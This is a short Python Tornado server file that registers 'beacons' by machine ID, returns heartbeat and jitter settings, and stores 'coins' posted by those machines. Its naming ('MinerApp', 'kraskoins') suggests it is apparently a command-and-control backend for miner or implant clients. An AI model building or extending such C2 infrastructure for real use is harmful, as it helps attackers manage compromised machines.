import tornado.ioloop
import tornado.web
import tornado.escape
import os
import sys
from sqlalchemy import *
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

Base = declarative_base()
 
class Beacons(Base):
    __tablename__ = 'beacons'
    id = Column(Integer, primary_key=True)
    mid = Column(String(250), nullable=False)
    heartbeat = Column(Integer, nullable=False)
    jitter = Column(Integer, nullable=False)
 
class Coins(Base):
    __tablename__ = 'coins'
    id = Column(Integer, primary_key=True)
    mid = Column(String(250), ForeignKey('beacons.mid'))
    kk = Column(Integer, nullable=False)

class dbMethods():

    def __init__(self, db):
        self.engine = create_engine(db)
        self.maker = sessionmaker(bind=self.engine)
        self.session = self.maker()
        
    def create(self):
        Base.metadata.create_all(self.engine)

    def newBeacon(self, m):
        if self.session.query(exists().where(Beacons.mid == m)).scalar():
            return
        else:
            new_beacon = Beacons(mid=m, heartbeat=30, jitter=15)
            self.session.add(new_beacon)
            self.session.commit()        

    def newCoin(self, m, k):
        if self.session.query(exists().where(Coins.kk == k)).scalar():
            return
        else:
            new_coin = Coins(mid=m, kk=k)
            self.session.add(new_coin)
            self.session.commit()        
        
class kkRequestHandler(tornado.web.RequestHandler):
    db=dbMethods('sqlite:///kraskoins.db')

    def post(self):
        self.kk = self.get_argument('kk')
        self.mid = self.get_argument('mid')
        self.db.newCoin(self.mid, self.kk)
        self.write('Coin recieved.')

    def get(self):
        self.mid = self.get_argument('mid')
        self.heartbeat = 30
        self.jitter = 15
        self.db.newBeacon(self.mid)
        #import pdb
        #pdb.set_trace()
        beacon = self.db.session.query(Beacons).filter_by(mid=self.mid).one()
        #jit = self.db.select(Beacons.columns.jitter).where(Beacons.columns.mid==mid)
        #json = tornado.escape.json_encode(dict(h=hb, j=jit))
        json = tornado.escape.json_encode(dict(h=beacon.heartbeat, j=beacon.jitter))
        self.write(json)
    
class MinerApp(tornado.web.Application):

    def __init__(self):
        self.clients = {}
        super().__init__([ (r'/beta', kkRequestHandler) ])

if __name__ == "__main__":
    kraskoins = dbMethods('sqlite:///kraskoins.db')
    kraskoins.create()

    app = MinerApp()
    app.listen(8888)
    tornado.ioloop.IOLoop.current().start()
